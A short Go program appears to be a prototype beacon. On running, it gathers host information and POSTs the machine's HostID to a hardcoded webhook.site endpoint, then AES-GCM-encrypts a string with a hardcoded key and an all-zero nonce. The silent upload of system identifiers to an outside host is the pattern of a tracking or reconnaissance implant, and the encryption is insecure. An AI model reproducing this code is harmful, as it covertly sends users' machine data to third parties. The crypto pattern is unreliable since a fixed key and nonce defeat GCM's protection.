package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"log"
	"net/http"
	"net/url"

	"github.com/shirou/gopsutil/host"
)

var link = "https://webhook.site/3da58b43-356c-4bff-b48e-df0ca1a0417d"

func EncryptAES(key []byte, plaintext string) string {
	// create cipher
	c, err := aes.NewCipher(key)
	if err != nil {
		log.Printf("error: %s", err)
	}
	gcm, err := cipher.NewGCM(c)
	nonce := make([]byte, gcm.NonceSize())
	ciphertext := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
	return hex.EncodeToString(ciphertext)
}

func main() {
	hostStat, _ := host.Info()

	fmt.Printf("%+v\n", hostStat)
	data := url.Values{
		"host": {hostStat.HostID},
	}

	_, err := http.PostForm(link, data)

	if err != nil {
		log.Printf("Request Failed: %s", err)
		return
	} else {
		log.Printf("Done :)")
	}

	fmt.Println(EncryptAES([]byte("hellotherehellotherehellothere12"), "heyheyeh"))

}
